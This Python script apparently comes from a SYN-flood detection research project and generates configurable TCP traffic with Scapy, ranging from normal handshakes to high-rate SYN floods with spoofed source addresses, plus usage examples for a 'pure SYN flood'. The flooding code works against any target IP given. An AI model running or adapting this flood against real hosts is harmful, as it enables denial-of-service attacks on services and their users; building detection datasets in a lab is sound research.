#!/usr/bin/env python3
"""Generates configurable TCP traffic — normal handshakes and/or SYN floods — with Scapy.

Runs as an attacker inside a network namespace (see setup_netns.sh) and is normally driven by
scenario_runner.py, which fires several of these concurrently at the victim. Sending raw SYNs
needs root, so run it with sudo.

Dependencies: scapy>=2.5.0
"""

import socket
import struct
import threading
import argparse
import csv
import os
import random
import signal
import sys
import time
from typing import Optional
from scapy.supersocket import SuperSocket  # for the type annotation only
from dataclasses import dataclass
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, conf  # type: ignore[import-untyped]

# Suppress Scapy's verbose output
conf.verb = 0

# RFC 5737 test-net ranges (safe for spoofing - not routable on the internet)
SPOOF_RANGES = [
    ("192.0.2.", 1, 254),  # TEST-NET-1
    ("198.51.100.", 1, 254),  # TEST-NET-2
    ("203.0.113.", 1, 254),  # TEST-NET-3
]


@dataclass
class TrafficConfig:
    """All configurable parameters for traffic generation."""

    target_ip: str = ""
    target_port: int = 8080
    duration: float = 30.0
    total_packets: int = 0  # 0 = unlimited (use duration)
    pps: int = 10  # packets per second
    complete_handshake_ratio: float = 1.0  # 1.0 = all normal, 0.0 = all SYN-only
    spoof_ips: bool = False
    sequential_ports: bool = False
    source_port_start: int = 49152
    handshake_timeout: float = 2.0
    send_fin: bool = True
    abortive_close: bool = (
        False  # RST-close completed handshakes (SO_LINGER 0) -> ~1 ACK each
    )
    experiment_name: str = ""
    log_file: str = ""
    verbose: bool = False


class TrafficGenerator:
    """
    Configurable traffic generator that produces both normal TCP traffic
    and SYN flood attack traffic using Scapy.
    """

    def __init__(self, config: TrafficConfig):
        self.config = config
        self._stop_requested = False
        self._sequential_port_counter = config.source_port_start
        self._packets_sent = 0
        self._connections_attempted = 0
        self._handshakes_completed = 0
        self._syn_only_sent = 0
        self._log_rows = []
        self._real_ip: str = ""
        self._l3: Optional[SuperSocket] = (
            None  # persistent scapy L3 socket (reused for every SYN)
        )
        self._pool: Optional[ThreadPoolExecutor] = None  # async handshake completion
        self._counter_lock = threading.Lock()

    def generate(self):
        """Main entry point. Sets up environment, generates traffic, cleans up."""
        self._log("Traffic Generator Configuration:")
        self._log(f"  Target: {self.config.target_ip}:{self.config.target_port}")
        self._log(f"  Rate: {self.config.pps} pps")
        self._log(f"  Duration: {self.config.duration}s")
        self._log(f"  Total packets limit: {self.config.total_packets or 'unlimited'}")
        self._log(f"  Handshake ratio: {self.config.complete_handshake_ratio:.2f}")
        self._log(f"  IP spoofing: {'ON' if self.config.spoof_ips else 'OFF'}")
        self._log(
            f"  Sequential ports: {'ON' if self.config.sequential_ports else 'OFF'}"
        )
        self._log(f"  Send FIN: {'ON' if self.config.send_fin else 'OFF'}")

        # Detect real IP
        self._real_ip = self._detect_real_ip()
        self._log(f"  Source IP (real): {self._real_ip}")

        try:
            self._setup()
            self._log("Starting traffic generation...")
            self._run_traffic_loop()
        except KeyboardInterrupt:
            self._log("\nInterrupted by user.")
        finally:
            self._teardown()
            self._print_summary()
            self._save_log()

    def _setup(self):
        """Create the persistent send socket and the handshake thread pool."""
        self._l3 = conf.L3socket()  # one reused socket -> avoids the ~25 pps ceiling
        self._pool = ThreadPoolExecutor(max_workers=64)

    def _teardown(self):
        if self._pool is not None:
            self._pool.shutdown(wait=True)  # let in-flight handshakes finish
        if self._l3 is not None:
            self._l3.close()

    def _detect_real_ip(self) -> str:
        """Detect the real source IP by creating a temporary connection."""
        import socket

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Doesn't actually send anything; just determines the route
            s.connect((self.config.target_ip, 80))
            return s.getsockname()[0]
        except Exception:
            return "0.0.0.0"
        finally:
            s.close()

    def _run_traffic_loop(self):
        interval = 1.0 / self.config.pps
        start = time.perf_counter()
        next_send = start

        if self._l3 is None or self._pool is None:
            raise RuntimeError("_setup() must run before _run_traffic_loop()")

        while not self._stop_requested:
            now = time.perf_counter()
            if self.config.duration > 0 and (now - start) >= self.config.duration:
                break
            if (
                self.config.total_packets > 0
                and self._connections_attempted >= self.config.total_packets
            ):
                break
            if now < next_send:
                time.sleep(next_send - now)  # precise sleep, not a busy-wait
                continue

            self._connections_attempted += 1
            src_ip = self._get_source_ip()
            src_port = self._get_source_port()
            complete = random.random() < self.config.complete_handshake_ratio

            if complete and not self.config.spoof_ips:
                self._pool.submit(
                    self._complete_handshake_os
                )  # real handshake, OFF the hot path
            else:
                self._emit_syn(
                    src_ip, src_port
                )  # flood, or spoofed "normal" (can't complete)

            next_send += interval
            if (
                next_send < time.perf_counter() - interval
            ):  # drift guard: don't infinitely catch up
                next_send = time.perf_counter()

    def _complete_handshake_os(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.config.handshake_timeout)
        try:
            s.connect(
                (self.config.target_ip, self.config.target_port)
            )  # kernel does SYN/SYN-ACK/ACK
            with self._counter_lock:
                self._handshakes_completed += 1
            if self.config.abortive_close:
                # RST on close() -> no FIN teardown ACKs (keeps the SYN:ACK ratio sensitive)
                s.setsockopt(
                    socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)
                )
            elif self.config.send_fin:
                s.shutdown(socket.SHUT_RDWR)  # graceful FIN
        except OSError:
            pass
        finally:
            s.close()

    def _emit_syn(self, src_ip, src_port):
        seq = random.randint(1000000, 4294967295)
        pkt = IP(src=src_ip, dst=self.config.target_ip) / TCP(
            sport=src_port, dport=self.config.target_port, flags="S", seq=seq
        )

        if self._l3 is None:
            raise RuntimeError("L3 socket not initialised; call _setup() first")
        self._l3.send(pkt)  # reused socket: fast + non-blocking

        with self._counter_lock:
            self._packets_sent += 1
            self._syn_only_sent += 1
        self._log_packet(
            time.time(),
            src_ip,
            self.config.target_ip,
            src_port,
            self.config.target_port,
            "S",
            seq,
            src_ip != self._real_ip,
            "sent_syn_only",
        )

    def _get_source_ip(self) -> str:
        """Get source IP (real or spoofed)."""
        if not self.config.spoof_ips:
            return self._real_ip

        # Pick a random IP from RFC 5737 test ranges
        prefix, low, high = random.choice(SPOOF_RANGES)
        return f"{prefix}{random.randint(low, high)}"

    def _get_source_port(self) -> int:
        """Get source port (random or sequential)."""
        if self.config.sequential_ports:
            port = self._sequential_port_counter
            self._sequential_port_counter += 1
            if self._sequential_port_counter > 65535:
                self._sequential_port_counter = self.config.source_port_start
            return port
        else:
            return random.randint(49152, 65535)

    def _log_packet(
        self,
        timestamp: float,
        src_ip: str,
        dst_ip: str,
        src_port: int,
        dst_port: int,
        flags: str,
        seq_num: int,
        is_spoofed: bool,
        action: str,
    ):
        """Record packet info for the sender log."""
        self._log_rows.append(
            {
                "timestamp": timestamp,
                "source_ip": src_ip,
                "destination_ip": dst_ip,
                "source_port": src_port,
                "destination_port": dst_port,
                "tcp_flags": flags,
                "seq_num": seq_num,
                "is_spoofed": is_spoofed,
                "action": action,
                "connection_no": self._connections_attempted,
            }
        )

    def _print_summary(self):
        """Print a summary of the traffic generation run."""
        self._log(f"\n{'=' * 50}")
        self._log("Traffic Generation Summary")
        self._log(f"{'=' * 50}")
        self._log(f"  Connections attempted: {self._connections_attempted}")
        self._log(f"  Total packets sent: {self._packets_sent}")
        self._log(f"  Handshakes completed: {self._handshakes_completed}")
        self._log(f"  SYN-only packets: {self._syn_only_sent}")
        if self._connections_attempted > 0:
            actual_ratio = self._handshakes_completed / self._connections_attempted
            self._log(f"  Actual handshake ratio: {actual_ratio:.2f}")
        self._log(f"{'=' * 50}")

    def _save_log(self):
        """Save sender log to CSV file."""
        if not self.config.log_file and not self.config.experiment_name:
            return

        log_path = self.config.log_file
        if not log_path and self.config.experiment_name:
            log_path = f"{self.config.experiment_name}_sender_log.csv"

        if not self._log_rows:
            self._log("No packets were sent; skipping log file.")
            return

        os.makedirs(
            os.path.dirname(log_path) if os.path.dirname(log_path) else ".",
            exist_ok=True,
        )

        fieldnames = [
            "timestamp",
            "source_ip",
            "destination_ip",
            "source_port",
            "destination_port",
            "tcp_flags",
            "seq_num",
            "is_spoofed",
            "action",
            "connection_no",
        ]

        with open(log_path, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(self._log_rows)

        self._log(f"Sender log saved to: {log_path}")

    def _log(self, message: str):
        """Print a timestamped log message."""
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{ts}] {message}")


def parse_args() -> TrafficConfig:
    """Parse command-line arguments and return a TrafficConfig."""
    parser = argparse.ArgumentParser(
        description="Traffic Generator for SYN Flood Detection Research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Normal traffic (all handshakes complete)
  sudo python3 traffic_generator.py --target-ip 192.168.1.100 \\
      --pps 5 --duration 60 --complete-handshake-ratio 1.0

  # Pure SYN flood (spoofed IPs, no handshakes)
  sudo python3 traffic_generator.py --target-ip 192.168.1.100 \\
      --pps 100 --duration 30 --complete-handshake-ratio 0.0 \\
      --spoof-ips --sequential-ports

  # Mixed traffic (30%% normal, 70%% SYN-only)
  sudo python3 traffic_generator.py --target-ip 192.168.1.100 \\
      --pps 50 --duration 30 --complete-handshake-ratio 0.3
        """,
    )

    parser.add_argument(
        "--target-ip", required=True, help="IP address of the victim machine"
    )
    parser.add_argument(
        "--target-port", type=int, default=8080, help="Target port (default: 8080)"
    )
    parser.add_argument(
        "--duration", type=float, default=30.0, help="Duration in seconds (default: 30)"
    )
    parser.add_argument(
        "--total-packets",
        type=int,
        default=0,
        help="Total connections to attempt; 0=use duration (default: 0)",
    )
    parser.add_argument(
        "--pps",
        type=int,
        default=10,
        help="Target connections per second (default: 10)",
    )
    parser.add_argument(
        "--complete-handshake-ratio",
        type=float,
        default=1.0,
        help="Ratio of complete handshakes: 1.0=all normal, "
        "0.0=all SYN-only (default: 1.0)",
    )
    parser.add_argument(
        "--spoof-ips",
        action="store_true",
        help="Use randomized source IPs (RFC 5737 test ranges)",
    )
    parser.add_argument(
        "--sequential-ports",
        action="store_true",
        help="Use sequential source ports instead of random",
    )
    parser.add_argument(
        "--source-port-start",
        type=int,
        default=49152,
        help="Starting port for sequential mode (default: 49152)",
    )
    parser.add_argument(
        "--handshake-timeout",
        type=float,
        default=2.0,
        help="Seconds to wait for SYN-ACK (default: 2.0)",
    )
    parser.add_argument(
        "--no-fin", action="store_true", help="Don't send FIN after normal connections"
    )
    parser.add_argument(
        "--abortive-close",
        action="store_true",
        help="Close completed handshakes with RST instead of FIN (fewer teardown ACKs)",
    )
    parser.add_argument(
        "--experiment-name", default="", help="Name for this experiment run"
    )
    parser.add_argument("--log-file", default="", help="Path for sender log CSV")
    parser.add_argument(
        "--verbose", action="store_true", help="Print each packet as it is sent"
    )

    args = parser.parse_args()

    config = TrafficConfig(
        target_ip=args.target_ip,
        target_port=args.target_port,
        duration=args.duration,
        total_packets=args.total_packets,
        pps=args.pps,
        complete_handshake_ratio=args.complete_handshake_ratio,
        spoof_ips=args.spoof_ips,
        sequential_ports=args.sequential_ports,
        source_port_start=args.source_port_start,
        handshake_timeout=args.handshake_timeout,
        send_fin=not args.no_fin,
        abortive_close=args.abortive_close,
        experiment_name=args.experiment_name,
        log_file=args.log_file,
        verbose=args.verbose,
    )

    if not 0.0 <= config.complete_handshake_ratio <= 1.0:
        parser.error("--complete-handshake-ratio must be between 0.0 and 1.0")
    if config.pps <= 0:
        parser.error("--pps must be a positive integer")

    return config


def main():
    # NOTE: Root privilege check is disabled for cross-platform development.
    # Uncomment when deploying on Linux where sudo is required for raw sockets.
    # if not hasattr(os, "geteuid") or os.geteuid() != 0:  # type: ignore
    #     print("ERROR: This script requires root privileges (raw sockets).")
    #     print("Usage: sudo python3 traffic_generator.py --target-ip <IP> [options]")
    #     sys.exit(1)

    config = parse_args()

    generator = TrafficGenerator(config)

    # Handle SIGINT gracefully
    def signal_handler(sig, frame):
        generator._stop_requested = True

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    generator.generate()


if __name__ == "__main__":
    main()
